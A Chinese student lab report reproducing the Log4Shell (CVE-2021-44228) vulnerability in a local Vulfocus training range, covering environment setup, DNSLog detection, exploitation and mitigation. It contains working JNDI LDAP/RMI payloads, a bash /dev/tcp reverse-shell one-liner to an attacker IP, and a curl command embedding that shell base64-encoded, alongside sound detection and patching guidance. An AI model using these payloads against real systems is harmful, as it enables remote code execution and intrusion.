# REPORT

Ani
---

- [负责工作](#负责工作)
- [实验目的](#实验目的)
- [实验环境](#实验环境)
- [实验过程](#实验过程)
    - [学习相关课程和资料](#学习相关课程和资料)
    - [从零开始搭建基础虚拟机环境](#从零开始搭建基础虚拟机环境)
    - [布置攻防训练环境](#把攻防训练环境从仓库中拉取到虚拟机系统中)
    - [测试部署本地的 Vulfocus](#测试部署本地的-vulfocus)
    - [漏洞的存在性检验 （CVE-2021-44228）](#漏洞的存在性检验-cve-2021-44228)
      - [漏洞介绍](#漏洞介绍)
      - [找到靶标的访问入口](#找到靶标的访问入口)
      - [检测漏洞存在性](#检测漏洞存在性)
    - [验证漏洞可利用性](#验证漏洞可利用性)
    - [漏洞利用效果](#漏洞利用效果)
        - [使用 JNDIExploit 工具](#使用-jndiexploit-工具)
    - [漏洞利用缓解与修复](#漏洞利用缓解与修复) 
        - [漏洞利用防御与加固](#漏洞利用防御与加固)
- [参考资料](#参考资料)

---

### 负责工作

- Log4j2 CVE-2021-44228
  - 漏洞存在性检验
  - 漏洞可利用性
  - 漏洞利用效果
  - 漏洞利用检验
  - 漏洞利用缓解与修复

### 实验目的

完成 **基础团队实践训练** ：开源信息系统搭建、加固与漏洞攻防

团队分工跟练复现完成 [网络安全(2021) 综合实验](http://courses.cuc.edu.cn/course/109860/learning-activity/full-screen#/554139) 。无论团队由多少人所组成，以下按本次实践训练所涉及到的人员能力集合划分了以下团队角色。一人至少承担一种团队角色，老师将按照该角色的评价标准进行 基于客观事实的主观评价 

- 红队：需完成漏洞存在性验证和漏洞利用

- 蓝队威胁监测：漏洞利用的持续检测和威胁识别与报告

- 蓝队威胁处置：漏洞利用的缓解和漏洞修复（源代码级别和二进制级别两种）

上述能力的基本评分原则参考 “道术器” 原则：最基础要求是能够跟练并复现 [网络安全(2021) 综合实验](http://courses.cuc.edu.cn/course/109860/learning-activity/full-screen#/554139) 中演示实验使用到的工具；进阶标准是能够使用课程视频中 **未使用** 的工具或使用编程自动化、甚至是智能化的方式完成漏洞攻击或漏洞利用行为识别与处置

### 实验环境

`Window 11`

`MacOS 12.6.7`

`VMware`

`VirtualBox`

`Kali 2023.2`

`Todesk`

`jadx`

`Burpsuite`

`Wireshark`

### 实验过程

#### 从零开始搭建基础虚拟机环境

之前电脑出了问题，将整个电脑都重置了，所以从零开始

先安装需要的环境如 `Vmware` 虚拟机、 `Kali` 镜像等

将下载好的 `Kali` 导入 `VMware` 虚拟机，并配置好两块网卡：网络地址转换 (`NAT`) 以及 仅主机 (`Host-Only`) 网络

![web](img/web.png)

其中第一块网卡负责让虚拟机能联网，而第二块网卡用于方便本地连接虚拟机

启动虚拟机，在终端查看网卡状态：

```bash
ip a
```

![ip](img/ipa.png)

可见虚拟机已经为两块网卡都分配好了地址，不需要我们手动配置

宿主机 `ssh` 连接虚拟机

```bash
ssh kali@192.168.254.128
```

出现如下报错：

![connect refuse](img/connectfail.png)

到 `Kali` 中设置开机自启动并手动启动服务

```bash
sudo systemctl enable ssh
sudo systemctl start ssh
```

![systemctl](img/systemctl.png)

检查进程：

```bash
ps aux|grep ssh
```

![jincheng](img/jincheng.png)

可见守护进程 `sshd` 已启动

还是连接失败，一直显示密码不对，然后发现连接命令写错了，是小写 `k` 不是大写 `K`

连接成功：

![link](img/link.png)

配置免密登录

使用命令复制公钥到虚拟机

```bash
ssh-copy id -i C:\Users\86133\.ssh\id_rsa.pub kali@192.168.254.128
```

![ssh](img/ssh.png)

显示如上问题，于是换了别的命令完成：

```bash
scp C:\Users\86133\.ssh\id_rsa.pub kali@192.168.254.128:/home/kali/tty
```
![scp](img/scp.png)

![scpend](img/scpkali.png)


将公钥传入 `authorized_keys` 中

```bash
cat id_rsa.pub >> ../.ssh/authorized_keys
```

报错如下：

![baocuo](img/worse.png)

查看一下 `~` 目录下所有的文件夹和文件

![ipa](img/ipano.png)

发现没有 `.ssh` 文件夹

执行 `ssh localhost`

![localhost](img/sshlocal.png)

再次查看出现 `.ssh` 文件夹

![ipa](img/ipassh.png)

现在可以成功传入公钥

![cat](img/cat.png)

实现免密登录

![mianmi](img/mianmi.png)

### 把攻防训练环境从仓库中拉取到虚拟机系统中

在模拟红蓝网络攻防实践的整个过程之前，需要完成本地环境的部署，使用老师提供的 [简易教程](https://github.com/c4pr1c3/ctf-games/tree/master/fofapro/vulfocus) 进行搭建：

```bash
git clone https://github.com/c4pr1c3/ctf-games.git
```

出现网络连接的问题

![fatalconnect](img/fatalconnect.png)

`ping` 一下发现是可以通的，再次尝试就连上了。这是因为解析 `github` 的域名解析到了不同的 `ip`，刚好第二次解析到一个可用的 `ip` ，他就可以了

![ping](img/ping.png)

通过使用 `Docker Compose` 来构造 `docker` 环境，其中 `git` 克隆下来的仓库中包含老师已经配置好的对应的 `.yml` 文件，直接执行即可构建对应的环境：

```bash
sudo apt update && sudo apt install -y docker.io docker-compose jq
```

![docker](img/docker.png)

将当前用户添加到 `docker` 用户组，免 `sudo` 执行 `docker` 相关指令：

```bash
$ sudo usermod -a -G docker ${USER}
```

重新登录 `shell` 生效

切换到 root 用户权限下执行：

更换 `docker` 镜像源，使用中科大 `Docker Hub` 镜像源：

```bash
cat <<EOF > /etc/docker/daemon.json
{
  "registry-mirrors": ["https://docker.mirrors.ustc.edu.cn/"]
}
EOF
```
重启 `docker` 服务使配置生效

```bash
systemctl daemon-reload
systemctl restart docker.service
```

![jingxiang](img/jignxiang.png)

提前拉取 `vulfocus` 镜像

```bash
docker pull vulfocus/vulfocus：latest
```

发现超级超级慢！查询资料发现由于访问原始站点的网络带宽等条件的限制，导致 `Docker Hub`,` Google Container Registry (gcr.io)` 与 `Quay Container Registry (quay.io)` 的镜像缓存处于基本不可用的状态，因此科大镜像站的各容器镜像服务仅限校内使用。当然也可能是我家的网实在是太慢了...

于是更换成以下源：

```bash
https://hub-mirror.c.163.com/
https://3cnn2icv.mirror.aliyuncs.com
```

![yuan](img/yuan.png)

拉取成功：

![vulfocus](img/vulfocus.png)

发现一件很搞笑的事情...配置了免密登录但是忘记这回事，前面都直接在虚拟机上操作

运行老师提供的脚本，并选择其推荐的支持对外访问 `vulfocus-web` 的 `ip`，这里推荐的是 `host-only` 网卡所分配到的地址

```bash
bash start.sh
```

![bash](img/bash.png)

这样 `docker` 镜像就可以跑起来了，在宿主机访问这个地址即可进入到 `vulfocus` 的页面：

![vulfocusweb](img/vulfocusweb.png)

### 测试部署本地的 Vulfocus

使用账号密码（这里均为 `admin`）登录后，选择 `镜像管理 -- 镜像管理 -- 一键同步` ，获取 `Vulfocus` 提供的镜像：

![tongbu](img/tongbu.png)

搜索需要的镜像并下载

![log4shell](img/log4shell.png)

下载完成后可在首页启动并测试环境

![xiazai](img/xiazai.png)

![qidong](img/qidong.png)

### 漏洞的存在性检验 （CVE-2021-44228）

#### 漏洞介绍

`log4j2` 是 `apache` 下的 `java` 应用常见的开源日志库，是一个就 `Java` 的日志记录工具。在 `log4j` 框架的基础上进行了改进，并引入了丰富的特性，可以控制日志信息输送的目的地为控制台、文件、`GUI` 组建等，被应用于业务系统开发，用于记录程序输入输出日志信息

#### 找到靶标的访问入口

修改镜像启动时间，启动靶机并访问 `http://192.168.254.128:50175/`

![qidong](img/qidong1.png)

![wangzhi](img/wangzhi.png)

因为后面出了问题，重做的启动截图为：

![qidong](img/qidong2.png)

打开该网址，报错如下：

![bug](img/bug4.png)

配置端口转发：

![duankou](img/duankou.png)

回到网页刷新即可：

![wangzhi](img/wangzhi1.png)

点击 `？？？？` 有：

![????](img/question.png)

该截图为解决了问题后重新启动点击 `????` 的截图

#### 检测漏洞存在性

查看容器相关信息

```bash
docker ps
```

![ps](img/ps.png)

得容器名为 `adoring_bhabha`

进入容器找到 `jar` 文件

```bash
docker exec -it adoring_bhabha bash
```

![jar](img/jar.png)

将 `jar` 文件复制到虚拟机上

```bash
sudo docker cp adoring_bhabha:/demo/demo.jar ./
```

并在虚拟机中下载反编译软件 `jadx`

[jadx 相关教程](https://blog.csdn.net/u014602228/article/details/122190940)

用反编译软件打开 `jar` 文件，可以看到存在漏洞代码

![daima](img/daima.png)

```bash
  logger.error("{}", payload);
  logger.info("{}", payload);
  logger.info(payload);
  logger.error(payload);
```

#### 验证漏洞可利用性

在 [DNSLog](https://link.zhihu.com/?target=http%3A//www.dnslog.cn/) 平台中获得随即域名，构造 `POST` 请求的 `payload`

![yuming](img/yuming.png)

这里得到的域名为 `bifd0d.dnslog.cn`

构造 `payload` 为 `${jndi:ldap://bifd0d.dnslog.cn/ohhhh}`

```bash
curl -X POST http://127.0.0.1:64748/hello -d 'payload="${jndi:ldap://bifd0d.dnslog.cn/ohhhh}"'
```

显示报错：

![bug](img/bug5.png)

查询后得知大致是因为该版本不支持 `POST` 的发送

然后查询过程中新建了虚拟机 `kali-attacker`，然后因为 `VMware` 没有双重加载的功能，然后我就将虚拟硬盘复制的副本作为这台新建的虚拟机的虚拟硬盘导入，然后就开始打不开第一台虚拟机。删去新建的虚拟机之后，原虚拟机可以重新打开，但是可能配置丢失，无法正常打开 `vulfocus` 界面了

后面换成了 `VirtualBox` 重新做前面的环境配置，但是在 `vulfocus` 镜像管理页面无法正常同步，且一直显示 `服务器内部错误，请联系管理员` 的报错

为了解决这个报错搞了好几天...

最终使用的官方新版本的 `vulfocus` 环境搭建并且修改了容器内 `views.py` 才解决，但我自己的电脑这样也不能解决，所以后续的实验是通过 `Todesk` 远程控制另一台 `MacOS` 系统的电脑完成的

后面重新做的时候，因为前面的报错改用 `Burpsuite` 手动发送请求

使用 `Burpsuite` 需要生成 `CA` 证书，导入网页并对网页进行代理配置：

![ca](img/cashengcheng.png)

![shezhidaili](img/shezhidaili.png)

使用 `Burpsuite` 进行抓包

其中参考了 [Burpsuite 使用教程](https://blog.csdn.net/weixin_40586270/article/details/81431997#:~:text=%E4%B9%8B%E5%89%8D%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%9C%89%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%B8%8BBurpsuit%EF%BC%8C%E4%BB%8A%E5%A4%A9%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%B8%8B%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Burpsuite%E8%BF%9B%E8%A1%8C%E6%8A%93%E5%8C%85%EF%BC%8C%E6%88%AA%E5%8C%85%EF%BC%8C%E6%94%B9%E5%8C%85%E3%80%82%20%E6%88%91%E8%BF%99%E9%87%8C%E6%98%AF%E5%9C%A8Kali%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%B5%8B%E8%AF%95%E7%9A%84%E3%80%82%20%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A,%E9%A6%96%E5%85%88%E8%AE%BE%E7%BD%AE%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E4%BB%A3%E7%90%86%EF%BC%8C%E4%B9%8B%E5%89%8D%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%9C%89%E8%AE%B2%E5%88%B0%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B8%8D%E5%86%8D%E8%AE%B2%E4%BA%86%E3%80%82%20%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%20%E6%89%93%E5%BC%80Burpsuite%2C%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86%2C%E4%BB%A3%E7%90%86ip%2C%E7%AB%AF%E5%8F%A3%E5%92%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%80%E8%87%B4%E3%80%82)

![get](img/get.png)

修改 `payload` 部分为新构造的替换字段 `${jndi:ldap://ktla3w.dnslog.cn}`，并选中 `右键 -- Convert selection -- URL --URL-encode all characters` 对新构造的字段进行编码

![bianma](img/bianma.png)

发送后刷新 `DNSLog.cn` 的结果可以看到有收到解析记录：

![dns](img/dns.png)

攻击者主机 `kali-attacker IP` 信息如下：

![attackerip](img/attackerip.png)

在 `attacker` 上下载 `log4j-scan`

```bash
git clone https://github.com/fullhunt/log4j-scan
```

![ls](img/ls.png)

切换到 `log4j-scan` 目录安装相关配置

```bash
pip3 install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple
```

没有 `pip` 相关配置先下载

```bash
sudo apt update && sudo apt install -y python3-pip
```

安装好配置后需要编辑 `log4j-scan.py`

```bash
sudo vi log4j-scan.py
```
进入编辑模式后，在 `post_data_parameters` 列表中加入 `payload` 

或者直接

```bash
sed -i.bak 's/password"/password", "payload"/' log4j-scan.py
```

然后执行

```bash
python3 log4j-scan.py --request-type post -u http://127.0.0.1:52666/hello --run-all-test
```

![python3](img/python3.png)

得到报错

```bash
requests.exceptions.ConnectionError: HTTPSConnectionPool(host='interact.sh', port=443): Max retries exceeded with url: /register (Caused by NewConnectionError('<urllib3.connection.HTTPSConnection object at 0x7f30a165c550>: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution'))
```

查询得大致是网络连接的问题，但实际上能 `ping` 通，参考 [文章](https://blog.csdn.net/qq_39377418/article/details/102552822) 问题主要是： `http` 的连接数超过最大限制，默认的情况下连接是 `Keep-alive` 的，所以这就导致了服务器保持了太多连接而不能再新建连接，`ip` 被封或程序请求速度过快 

#### 漏洞利用效果

攻击者主机输入下列命令启动 `7777` 端口

```bash
nc -l -p 7777
```

受害者主机进到容器中输入构造反弹 `shell` 的 `payload`

```bash
bash -i >& /dev/tcp/192.168.56.3/7777 0>&1
```

![dockerps](img/dockerps.png)

![bashfantan](img/bashfantan.png)

回车后攻击者主机可以窥探受害者主机的信息

![kuitan](img/kuitan.png)

通过 `ls /tmp` 可以查看到 `flag`

![flag](img/flag.png)

`flag` 为`{bmh77cd8510-b156-4b57-acd0-55f780279fc0}`

##### 使用 `JNDIExploit` 工具

在攻击者主机输入下载命令

```bash
wget https://hub.fastgit.org/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip
```

报错如下

![bug](img/bug6.png)

加了参数 `--no-check-cartificate` 报错 `403`，可能是资源不存在了

根据提示信息直接去仓库下载，我这里需要翻墙，不然下不了

下好之后拖进虚拟机，此时我的系统是 `MacOS` ，报错如下

![tuozhuai](img/tuozhuai.png)

新安装了 `Extension` 拓展包并打开系统隐私权限也无法拖拽，于是曲线救国使用 `ssh` 将文件远程传入虚拟机

```bash
scp JNDIExploit.v1.2.zip kali@192.168.58.3:./
```

![scp](img/scpzip.png)

![ls1](img/ls1.png)

解压并计算 `sha56` 加密值，对比老师的一致

![unzip](img/unzip.png)

攻击者主机监听受害者主机的 `1389` 和 `8080` 端口

```bash
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.56.2
```

![jianting](img/jianting1.png)

攻击者主机等待 `victim` 反弹回连 `getshell`，获取可用 `payload` 清单

![-u](img/-u.png)

受害者主机执行反弹

```bash
curl http://127.0.0.1:26925/hello -d 'payload=${jndi:ldap://192.168.56.3:1389/TomcatBypass/Command/Base64/'$(echo -n 'bash -i >& /dev/tcp/192.168.56.3/7777 0>&1' | base64 -w 0 | sed 's/+/%252B/g' | sed 's/=/%253d/g')'}'
```

![curl](img/curl.png)

报错如下，请教同学知是因为 `curl` 不能发送 `post` 请求，于是尝试用他们的方法

应用工具 `JNDI-Injection-Exploit` 搭建服务

```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “命令” -A “ip（攻击机）”
```

将构造的 `payload` 进行 `base64` 加密

```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjMvNzc3NyAwPiYx
```

执行 `JNDI-Injection-Exploit`

![javain](img/javain.png)

使用 `Burpsuite` 抓包并修改 `payload` 为获取到的

```bash
${jndi:rmi://192.168.56.3:1099/prj2oz}
```
![zhuabao](img/zhuabao.png)

攻击者主机监听

![jianting](img/jianting.png)

但我这里也没有成功监听到

最后将之前获得的 `flag` 提交

![tongguo](img/tongguo.png)

#### 漏洞利用检测

使用 `Docker` 的网络命名空间和网络抓包工具来捕获和分析流量

```bash
docker ps
```

![dockerps](img/ps1.png)

查看容器网络命名

```bash
docker inspect -f '{{.State.Pid}}' 5a70f12a4f37
```

![webname](img/webname.png)

进入容器的网络命名空间并将在 `eth0` 网络接口上捕获的流量保存为 `captured.pcap`

```bash
nsenter -t 81738 -n
tcpdump -i eth0 -w captured.pcap
```

![pcap](img/pcap.png)

将文件用 `Wireshark` 打开分析

![pcap1](img/pcap1.png)

可以看到有疑似远程代码执行的攻击流量

#### 漏洞利用缓解与修复

缓解与修复方案：

- 升级 `JDK`

- 修改 `Log4j2` 配置

  - 当 `log4j2` 版本 >= 2.10 的情况使用如下缓解措施

    - 环境变量中增加如下配置：

    ```
    LOG4J_log4j2.formatMsgNoLookups=true
    ```
    - 项目 `classpath` 下新建配置文件 `log4j2.component.properties`，内容如下：

    ```
    log4j2.formatMsgNoLookups=true
    ```
    - 添加 `jvm` 启动加载参数 
    ```
    Dlog4j2.formatMsgNoLookups=true
    ``` 
  - 当 `log4j2` 版本 < 2.10 的情况使用如下缓解措施在项目 `src` 目录中的配置文件 `log4j2.xml` 中，修改 `PatternLayout` 的值
  ```xml
  <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg{nolookups}%n"/>
  或
  <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %m{nolookups}%n"/>
  ```

  完整文件：
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <Configuration status="WARN">
      <Appenders>
          <!-- 默认打印到控制台 -->
          <Console name="Console" target="SYSTEM_OUT">
              <!-- 关键内容 -->
              <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg{nolookups}%n"/>
         </Console>
      </Appenders>
      <Loggers>
          <!-- 默认打印日志级别为 error -->
          <Root level="error">
              <AppenderRef ref="Console"/>
         </Root>
      </Loggers>
    </Configuration>
  ```

- 将项目依赖的 `Log4j2` 升级到最新版本

  当项目对于 `Log4j2` 有强依赖时，在项目主 `pom.xml` 中引入 `Log4j2` 的最新版本进行版本覆盖：

  ```xml
  <dependencies>
	        <dependency>
                <groupId>org.apache.logging.log4j</groupId>
                <artifactId>log4j-api</artifactId>
                <version>2.17.0</version>
            </dependency>
            <dependency>
                <groupId>org.apache.logging.log4j</groupId>
                <artifactId>log4j-core</artifactId>
                <version>2.17.0</version>
            </dependency>
            <dependency>
                <groupId>org.apache.logging.log4j</groupId>
                <artifactId>log4j-to-slf4j</artifactId>
                <version>2.17.0</version>
            </dependency>
  </dependencies>
  ```

- 将项目中的 `Log4j2` 依赖排除

  当项目对于 `Log4j2` 没有强依赖时，利用` Maven Helper` 插件搜索出，依赖关系，在引入依赖的节点直接将 `Log4j2` 的引入排除掉

  ```xml
  <dependency>
      <groupId>org.springframework.boot</groupId>
      <artifactId>spring-boot-starter-jdbc</artifactId>
        <exclusions>
            <exclusion>
               <groupId>org.apache.logging.log4j</groupId>
                <artifactId>log4j-to-slf4j</artifactId>
            </exclusion>
        </exclusions>
  </dependency>
  ```

- 第三方应用服务修复
  - 此次漏洞受影响的范围还是非常广泛的，包括一些常用的中间件、数据库。这些第三方的应用服务，短时间内在官方没有发布安全版本的情况下，只能临时通过替换应用目录中的 `jar` 文件的方式进行修复；可以去官方的 `snapshot` 库下载最新的 `jar` 文件，对第三方服务进行替换操作；(注意做好文件备份工作，有的服务可能会出现启动失败的情况)

##### 漏洞利用防御与加固

攻击原理和防御方式图

![log4j2](img/log4j2attack.png)




### 参考资料

[网络安全 2021 综合实验](https://www.bilibili.com/video/BV1p3411x7da?p=4&spm_id_from=pageDriver&vd_source=c77148c25420ef65a1b98a765a8e118c)

[课件](https://c4pr1c3.github.io/cuc-ns-ppt/vuls-awd.md.v4.html)

[VMware 双网卡配置](https://blog.csdn.net/qiu_zhi_liao/article/details/81268073)

[本地免密登录](https://blog.csdn.net/Weary_PJ/article/details/104561720)

[Docker Hub 源使用帮助](https://mirrors.ustc.edu.cn/help/dockerhub.html)

[log4j2 官网介绍](https://logging.apache.org/log4j/2.x/index.html)

[bash_dev_tcp 介绍](https://becivells.github.io/2019/01/bash_i_dev_tcp/)

[log4j2 漏洞缓解](https://zhuanlan.zhihu.com/p/444329520#:~:text=Apache%20log4j2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20%28JNDI%E6%B3%A8%E5%85%A5%29%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%92%8C%E5%BD%B1%E5%93%8D%E7%BC%93%E8%A7%A3%201%200x01%20%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%202%20log4j2%E7%89%88%E6%9C%AC%3E%3D2.10%E7%9A%84%E6%83%85%E5%86%B5%E4%BD%BF%E7%94%A8%E5%A6%82%E4%B8%8B%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%EF%BC%9A,4%20Log4j2%202.15.0%20jar%E5%8C%85%E4%B8%8B%E8%BD%BD%EF%BC%9A%20%E6%9C%80%E5%90%8E%20%E6%9C%89%E9%81%93%E4%BA%91%E7%AC%94%E8%AE%B0%20%E6%9C%80%E5%90%8E%20)

[Log4j2漏洞修复](https://blog.csdn.net/derstsea/article/details/121918902)

[Wireshark 网络数据包角度看log4j](https://blog.csdn.net/weixin_47627078/article/details/122251204)
---

